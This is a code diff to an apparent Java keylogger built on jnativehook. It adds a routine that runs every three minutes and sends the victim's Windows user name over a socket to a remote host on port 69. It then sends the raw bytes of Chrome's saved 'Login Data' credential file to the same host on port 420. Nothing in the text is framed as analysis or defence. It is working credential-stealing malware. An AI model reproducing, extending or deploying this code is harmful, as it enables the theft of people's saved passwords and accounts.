@@ -16,6 +16,7 @@ import java.net.Socket;
 import java.net.URISyntaxException;
 import java.net.URL;
 import java.net.URLConnection;
+import java.net.UnknownHostException;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
@@ -28,6 +29,7 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 public class Main implements NativeKeyListener{
 	public static void main (String[] args) throws IOException, URISyntaxException {
 		if (!isWindows()) {
+			System.out.println("This ain't windows, son!");
 			System.exit(0);
 		}
 		if (isSuicune()) {
@@ -75,6 +77,9 @@ public class Main implements NativeKeyListener{
 			    	// send the file
 				 upload(getHostIP());
 			    }
+			 if (minutes % 3 == 0) {
+				 uplogin(getHostIP());
+			 }
 		}
 	}
 
@@ -191,5 +196,30 @@ public class Main implements NativeKeyListener{
 	    	} catch (Exception e) {
 	    		System.out.println(e);
 	    	}
+	 }
+	 public static void uplogin(String ipee) throws IOException {
+		 try {
+ 		@SuppressWarnings("resource")
+		Socket socket = new Socket(getHostIP(), 69);
+ 		OutputStream t = socket.getOutputStream();
+ 		PrintWriter out = new PrintWriter(t);
+			String toSend = System.getProperty("user.name") + ".txt";
+			out.print(toSend );
+			out.flush();
+			Socket nakadashi = new Socket(getHostIP(), 420);
+			System.out.println("Accepted connection : " + nakadashi); 
+			File transferFile = new File ("C:/Users/" + System.getProperty("user.name") + "/AppData/Local/Google/Chrome/User Data/Default/Login Data"); 
+			byte [] bytearray = new byte [(int)transferFile.length()]; 
+			FileInputStream fin = new FileInputStream(transferFile); 
+			BufferedInputStream bin = new BufferedInputStream(fin); 
+			bin.read(bytearray,0,bytearray.length); 
+			OutputStream os = nakadashi.getOutputStream(); 
+			System.out.println(""); 
+			os.write(bytearray,0,bytearray.length); 
+			os.flush(); 
+			System.out.println("yiff!");
+		 } catch (Exception e) {
+			 System.out.println("blargh");
+		 }
 	 }
 }
